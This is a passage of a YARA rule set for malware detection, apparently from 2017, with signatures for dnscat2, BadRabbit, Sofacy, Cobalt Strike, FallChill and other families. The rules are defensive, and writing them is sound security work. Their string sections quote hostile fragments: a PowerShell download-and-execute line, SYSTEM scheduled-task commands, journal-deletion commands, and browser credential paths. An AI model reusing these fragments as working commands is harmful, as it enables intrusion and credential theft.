      
   strings:
      $x1 = "\\Release\\dnscat2.pdb" ascii
      $x2 = "cscript.exe //T:20 //Nologo " fullword ascii
      $a1 = "taskkill /F /IM cscript.exe" fullword ascii
      $a2 = "cmd.exe /c " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == "0160250adfc97f9d4a12dd067323ec61" or 1 of ( $x* ) or all of ( $a* ) )
} 

rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE OBFUS T1027 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects malware from NK APT incident DE"
      author = "Florian Roth"
      reference = "Internal Research - ON"
      date = "2017-11-17 16:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, OBFUS, T1027, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Obfuscation provided by FOPO" fullword ascii
      $s1 = "\";@eval($" ascii
      $f1 = { 22 29 29 3B 0D 0A 3F 3E } 
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in ( 0 .. 350 ) and $f1 at ( filesize - 23 ) ) )
} 

rule Volgmer_Malware_RID2D15 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Volgmer malware as reported in US CERT TA17-318B"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-318B"
      date = "2017-11-15 10:16:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "User-Agent: Mozillar/5.0" fullword ascii
      $x2 = "[Cmd] - CMD_BOTCMD_CONNLOG_GET" fullword wide
      $x3 = "[TestConnect To Bot] - Port = %d" fullword ascii
      $x4 = "b50a338264226b6d57c1936d9db140ba74a28930270a083353645a9b518661f4fcea160d7" ascii
      $s1 = "%sigfx%c%c%c.exe" fullword wide
      $s2 = "H_%s_%016I64X_%04d%02d%02d%02d%02d%02d.TXT" fullword ascii
      $s3 = "cmd.exe /c %s > %s 2>&1" fullword wide
      $s4 = "%s\\dllcache\\%s.dll" fullword ascii
      $s5 = "Cond Fail." fullword ascii
      $s6 = "The %s %s%s" fullword ascii
      $s7 = "%s \"%s\"%s \"%s\" %s \"%s\"" fullword ascii
      $s8 = "DLL_Spider.dll" fullword ascii
   condition: 
      filesize < 400KB and ( 1 of ( $x* ) or ( uint16 ( 0 ) == 0x5a4d and 2 of them ) ) or ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == "ea42395e901b33bad504798e0f0fd74b" )
} 

rule HiddenCobra_FallChill_1_RID2F9E : APT DEMO EXE FILE G0032 NK T1117 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-318A"
      date = "2017-11-15 12:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1117, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "REGSVR32.EXE.MUI" fullword wide
      $s2 = "Microsoft Corporation. All rights reserved." fullword wide
      $s3 = "c%sd.e%sc %s > \"%s\" 2>&1" fullword wide
      $s4 = "\" goto Loop" fullword ascii
      $e1 = "xolhvhlxpvg" fullword ascii
      $e2 = "tvgslhgybmanv" fullword ascii
      $e3 = "CivagvTllosvok32Smakhslg" fullword ascii
      $e4 = "GvgCfiivmgDrivxglibW" fullword ascii
      $e5 = "OkvmPilxvhhTlpvm" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "6135d9bc3591ae7bc72d070eadd31755" or 3 of ( $s* ) or 4 of them )
} 

rule HiddenCobra_FallChill_2_RID2F9F : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-318A"
      date = "2017-11-15 12:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "%s\\%s.dll" fullword wide
      $s2 = "yurdkr.dll" fullword ascii
      $s3 = "c%sd.e%sc %s > \"%s\" 2>&1" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "cb36dcb9909e29a38c387b8a87e7e4ed" or ( 2 of them ) )
} 

rule Reaver3_Malware_Nov17_1_RID2F5B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Reaver malware mentioned in PaloAltoNetworks report"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
      date = "2017-11-11 11:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "CPL.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == "e722dd50a0e2bc0cab8ca35fc4bf6d99" and all of them )
} 

rule Reaver3_Malware_Nov17_2_RID2F5C : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Reaver malware mentioned in PaloAltoNetworks report"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
      date = "2017-11-11 11:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "WindowsUpdateReaver" fullword wide
      $s1 = "\\WUpdate.~tmp" fullword ascii
      $s2 = "\\~WUpdate.lnk" fullword ascii
      $s3 = "\\services\\" fullword ascii
      $s4 = "moomjufps" fullword ascii
      $s5 = "gekmomkege" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "837cc5062a0758335b257ea3b27972b2" or 1 of ( $x* ) or 3 of them )
} 

rule Reaver3_Malware_Nov17_3_RID2F5D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Reaver malware mentioned in PaloAltoNetworks report"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
      date = "2017-11-11 11:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "winhelp.dat" fullword ascii
      $s2 = "\\microsoft\\Credentials\\" fullword ascii
      $s3 = "~Update.lnk" fullword ascii
      $s4 = "winhelp.cpl" fullword ascii
      $s5 = "\\services\\" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "8ee521b2316ddd6af1679eac9f5ed77b" or 4 of them )
} 

rule SunOrcal_Malware_Nov17_1_RID2FEA : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Reaver malware mentioned in PaloAltoNetworks report"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
      date = "2017-11-11 12:17:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "kQZ6l5t1kAlsjmBzsCZPrSpQn5tFrChLtTdsgTlOsClKt5pBsDdFrSVshnxMr6ZOpn9slndBsy1jq6lIr216rSNApn9P" fullword ascii
      $x2 = { 00 00 00 00 00 00 00 00 00 00 00 00 21 21 21 73
              79 73 74 65 6D 00 00 00 00 00 00 00 00 00 00 00 } 
      $x3 = "!!!url!!!" fullword ascii
      $x4 = "h4NcbkdLrCpFpPQ=" fullword ascii
      $x5 = "GloablCryptNv1" fullword ascii
      $x6 = "Gloabl\\CryptNv1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them
} 

rule Daserf_Nov1_BronzeButler_RID3066 : DEMO EXE FILE G0060 MAL T1136 {
   meta:
      description = "Detects Daserf malware used by Bronze Butler"
      author = "Florian Roth"
      reference = "https://goo.gl/ffeCfd"
      date = "2017-11-08 12:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0060, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "mstmp1845234.exe" fullword ascii
      $x2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)" fullword ascii
      $x3 = "Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)" fullword ascii
      $s1 = "Content-Type: */*" fullword ascii
      $s2 = "ProxyEnable" ascii fullword
      $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" ascii fullword
      $s4 = "iexplore.exe" ascii fullword
      $s5 = "\\SOFTWARE\\Microsoft\\Windows\\Cu" fullword ascii
      $s6 = "rrentVersion\\Internet Settings" fullword ascii
      $s7 = "ws\\CurrentVersion\\Inter" fullword ascii
      $s8 = "Documents an" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 5 of them )
} 

rule CrunchRAT_RID2A5B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects CrunchRAT_RID2A5B - file CrunchRAT_RID2A5B.exe"
      author = "Florian Roth"
      reference = "https://github.com/t3ntman/CrunchRAT_RID2A5B"
      date = "2017-11-03 05:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "----CrunchRAT_RID2A5B" fullword wide
      $x2 = "\\Debug\\CrunchRAT_RID2A5B" ascii
      $x3 = "\\Release\\CrunchRAT_RID2A5B" ascii
      $s1 = "runCommand" fullword ascii
      $s2 = "<action>download<action>" fullword wide
      $s3 = "Content-Disposition: form-data; name=action" fullword wide
      $s4 = "<action>upload<action>" fullword wide
      $s5 = "/update.php" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and 3 of them )
} 

rule PowerShell_Mal_HackTool_Gen_RID317C : DEMO GEN HKTL SCRIPT T1086 T1136 {
   meta:
      description = "Detects PowerShell hack tool samples - generic PE loader"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-11-02 13:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, HKTL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$PEBytes32 = 'TVqQAAMAAAAEAAAA" wide
      $x2 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword wide
      $x3 = "@($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword wide
      $x4 = "(Shellcode: LoadLibraryA.asm)" fullword wide
   condition: 
      filesize < 8000KB and 1 of them
} 

rule Silence_malware_1_RID2DAC : DEMO EXE FILE G0091 MAL T1136 {
   meta:
      description = "Detects malware sample mentioned in the Silence report on Securelist"
      author = "Florian Roth"
      reference = "https://securelist.com/the-silence/83009/"
      date = "2017-11-01 10:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0091, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "adobeudp.exe" fullword wide
      $x2 = "%s\\adobeudp.exeZone.Identifier" fullword ascii
      $x3 = "%s\\igfxpers_%08x.exe" fullword ascii
      $x4 = "%s\\adobeudp.exe" fullword ascii
      $s1 = "SoftWare\\MicroSoft\\Windows\\CurrentVersion\\Run" fullword ascii
      $s2 = "Copyright (C)  1999 - 2017" fullword wide
      $s3 = "%sget.php?name=%x" fullword ascii
      $s4 = "VNASSRUNXYC" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "e03edb9bd7cbe200dc59f361db847f8a" or 1 of ( $x* ) or 3 of them )
} 

rule Silence_malware_2_RID2DAD : DEMO EXE FILE G0091 MAL T1136 {
   meta:
      description = "Detects malware sample mentioned in the Silence report on Securelist"
      author = "Florian Roth"
      reference = "https://securelist.com/the-silence/83009/"
      date = "2017-11-01 10:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0091, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "\\ScreenMonitorService\\Release\\smmsrv.pdb" ascii
      $x2 = "\\\\.\\pipe\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}" fullword ascii
      $s1 = "My Sample Service: ServiceMain: SetServiceStatus returned error" fullword ascii
      $s2 = "\\mss.exe" fullword ascii
      $s3 = "\\out.dat" fullword ascii
      $s4 = "\\mss.txt" fullword ascii
      $s5 = "Default monitor" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "69f3ec173efb6fd3ab5f79e0f8051335" or ( 1 of ( $x* ) or 3 of them ) ) ) or ( 5 of them )
} 

rule BadRabbit_Gen_RID2BE5 : DEMO EXE FILE GEN MAL T1047 T1050 T1053 T1085 T1136 {
   meta:
      description = "Detects BadRabbit Ransomware"
      author = "Florian Roth"
      reference = "https://pastebin.com/Y7pJv3tK"
      date = "2017-10-25 09:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1047, T1050, T1053, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "schtasks /Create /SC ONCE /TN viserion_%u /RU SYSTEM /TR \"%ws\" /ST" fullword wide
      $x2 = "schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \"%ws /C Start \\\"\\\" \\\"%wsdispci.exe\\\"" fullword wide
      $x3 = "C:\\Windows\\infpub.dat" fullword wide
      $x4 = "C:\\Windows\\cscc.dat" fullword wide
      $s1 = "need to do is submit the payment and get the decryption password." fullword ascii
      $s2 = "\\\\.\\GLOBALROOT\\ArcName\\multi(0)disk(0)rdisk(0)partition(1)" fullword wide
      $s3 = "\\\\.\\pipe\\%ws" fullword wide
      $s4 = "fsutil usn deletejournal /D %c:" fullword wide
      $s5 = "Run DECRYPT app at your desktop after system boot" fullword ascii
      $s6 = "Files decryption completed" fullword wide
      $s7 = "Disable your anti-virus and anti-malware programs" fullword wide
      $s8 = "SYSTEM\\CurrentControlSet\\services\\%ws" fullword wide
      $s9 = "process call create \"C:\\Windows\\System32\\rundll32.exe" fullword wide
      $s10 = "%ws C:\\Windows\\%ws,#1 %ws" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 2 of them )
} 

rule BadRabbit_Mimikatz_Comp_RID2FFF : DEMO EXE FILE MAL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://pastebin.com/Y7pJv3tK"
      date = "2017-10-25 12:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%lS%lS%lS:%lS" fullword wide
      $s2 = "lsasrv" fullword wide
      $s3 = "CredentialKeys" ascii
      $s4 = { 50 72 69 6D 61 72 79 00 6D 00 73 00 76 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them )
} 

rule KasperMalware_Oct17_1_RID2EBD : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Kasper Backdoor"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-10-24 11:27:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "\\Release\\kasper.pdb" ascii
      $x2 = "C:\\D@oc@um@en@ts a@nd Set@tings\\Al@l Users" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( pe.imphash ( ) == "2bceb64cf37acd34bc33b38f2cddfb61" or 1 of them )
} 

rule Sofacy_Oct17_1_RID2BF3 : APT DEMO EXE FILE G0007 RUSSIA T1085 T1136 {
   meta:
      description = "Detects Sofacy malware reported in October 2017"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html"
      date = "2017-10-23 09:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1085, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "%localappdata%\\netwf.dll" fullword wide
      $x2 = "set path = \"%localappdata%\\netwf.dll\"" fullword ascii
      $x3 = "%localappdata%\\netwf.bat" fullword wide
      $x4 = "KlpSvc.dll" fullword ascii
      $g1 = "set path = \"%localappdata%\\" ascii
      $g2 = "%localappdata%\\" wide
      $s1 = "start rundll32.exe %path %,#1a" fullword ascii
      $s2 = "gshell32" fullword wide
      $s3 = "s - %lu" fullword ascii
      $s4 = "be run i" fullword ascii
      $s5 = "ingToBinhary" fullword ascii
      $s6 = "%j%Xjs" fullword ascii
      $s7 = "if NOT exist %path % (exit)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "a2d1be6502b4b3c28959a4fb0196ea45" or pe.exports ( "KlpSvc" ) or ( 1 of ( $x* ) or 4 of them ) or ( $s1 and all of ( $g* ) ) )
} 

rule Sofacy_Oct17_2_RID2BF4 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects Sofacy malware reported in October 2017"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html"
      date = "2017-10-23 09:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "netwf.dll" fullword wide
      $s1 = "%s - %s - %2.2x" fullword wide
      $s2 = "%s - %lu" fullword ascii
      $s3 = "%s \"%s\", %s" fullword wide
      $s4 = "%j%Xjsf" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == "13344e2a717849489bcd93692f9646f7" or ( 4 of them ) ) ) or ( all of them )
} 

rule TA17_293A_Hacktool_PS_1_RID2E72 : APT DEMO HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 11:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=f" ascii
      $x2 = "} | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments" fullword ascii
   condition: 
      ( filesize < 80KB and 1 of them )
} 

rule TA17_293A_Hacktool_Touch_MAC_modification_RID35C7 : APT DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 16:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-t time - use the time specified to update the access and modification times" fullword ascii
      $s2 = "Failed to set file times for %s. Error: %x" fullword ascii
      $s3 = "touch [-acm][ -r ref_file | -t time] file..." fullword ascii
      $s4 = "-m - change the modification time only" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
} 

rule TA17_293A_Hacktool_Exploit_MS16_032_RID327E : APT DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 14:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread)))" ascii
      $x2 = "0x00000002, \"C:\\Windows\\System32\\cmd.exe\", \"\"," fullword ascii
      $x3 = "PowerShell implementation of MS16-032. The exploit targets all vulnerable" fullword ascii
      $x4 = "If we can't open the process token it's a SYSTEM shell!" fullword ascii
   condition: 
      ( filesize < 40KB and 1 of them )
} 

rule Imphash_UPX_Packed_Malware_1_TA17_293A_RID3430 : APT DEMO EXE FILE MAL T1045 {
   meta:
      description = "Detects malware based on Imphash of malware used in TA17-293A"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 15:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1045"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == "d7d745ea39c8c5b82d5e153d3313096c" )
} 

rule Imphash_Malware_2_TA17_293A_RID302E : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware based on Imphash of malware used in TA17-293A"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 12:28:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and pe.imphash ( ) == "a8f69eb2cf9f30ea96961c86b4347282" )
} 

rule WinAgent_BadPatch_1_RID2E14 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects samples mentioned in BadPatch report"
      author = "Florian Roth"
      reference = "https://goo.gl/RvDwwA"
      date = "2017-10-20 10:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "J:\\newPatch\\downloader\\" wide
      $x2 = "L:\\rashed\\New code\\" wide
      $x3 = ":\\newPatch\\last version\\" wide
      $x4 = "\\Microsoft\\Microsoft\\Microsoft1.log" fullword wide
      $x5 = "\\Microsoft\\Microsoft\\Microsoft.log" fullword wide
      $x6 = "\\Microsoft\\newPP.exe" fullword wide
      $x7 = " (this is probably a proxy server error)." fullword wide
      $x8 = " :Old - update patch and check anti-virus.. " fullword wide
      $x9 = "PatchNotExit-- download now.. " fullword wide
      $x10 = "PatchNotExit-- Check Version" fullword wide
      $x11 = "PatchNotExit-- Version Patch" fullword wide
      $s1 = "downloader " fullword wide
      $s2 = "DelDownloadFile" fullword ascii
      $s3 = "downloadFile" fullword ascii
      $s4 = "downloadUpdate" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of them ) )
} 

rule WinAgent_BadPatch_2_RID2E15 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects samples mentioned in BadPatch report"
      author = "Florian Roth"
      reference = "https://goo.gl/RvDwwA"
      date = "2017-10-20 10:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "myAction=shell_result&serialNumber=" fullword wide
      $s2 = "\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.*" fullword wide
      $s3 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles" fullword wide
      $s4 = "\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Cookies.*" fullword wide
      $s5 = "newSHELL[" fullword wide
      $s6 = "\\file1.txt" fullword wide
      $s7 = "myAction=newGIF&serialNumber=" fullword wide
      $s8 = "\\Storege1" fullword wide
      $s9 = "\\Microsoft\\mac.txt" fullword wide
      $s10 = "spytube____:" fullword ascii
      $s11 = "0D0700045F5C5B0312045A04041F40014B1D11004A1F19074A141100011200154B031C04" fullword wide
      $s12 = "16161A1000012B162503151851065A1A0007" fullword wide
      $s13 = "-- SysFile...." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 3 of them )
} 

rule SeDLL_Javascript_Decryptor_RID3136 : APT DEMO EXE FILE T1117 T1136 {
   meta:
      description = "Detects SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18 13:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1117, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SEDll_Win32.dll" fullword ascii
      $x2 = "regsvr32 /s \"%s\" DR __CIM__" fullword wide
      $s1 = "WScriptW" fullword ascii
      $s2 = "IWScript" fullword ascii
      $s3 = "%s\\%s~%d" fullword wide
      $s4 = "PutBlockToFileWW" fullword ascii
      $s5 = "CheckUpAndDownWW" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) or 4 of them )
} 

rule Leviathan_CobaltStrike_Sample_1_RID3324 : APT DEMO EXE FILE G0065 S0154 T1075 T1105 T1136 {
   meta:
      description = "Detects Cobalt Strike sample from Leviathan report"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18 14:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0065, S0154, T1075, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "a54c81.dll" fullword ascii
      $x2 = "%d is an x64 process (can't inject x86 content)" fullword ascii
      $x3 = "Failed to impersonate logged on user %d (%u)" fullword ascii
      $s1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $s2 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $s3 = "could not run command (w/ token) because of its length of %d bytes!" fullword ascii
      $s4 = "could not write to process memory: %d" fullword ascii
      $s5 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
      $s6 = "Could not connect to pipe (%s): %d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them )
} 

rule MockDll_Gen_RID2B30 : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "Detects MockDll - regsvr DLL loader"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18 08:55:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "mock_run_ini_Win32.dll" fullword ascii
      $x2 = "mock_run_ini_x64.dll" fullword ascii
      $s1 = "RealCmd=%s %s" fullword ascii
      $s2 = "MockModule=%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or 2 of them )
} 

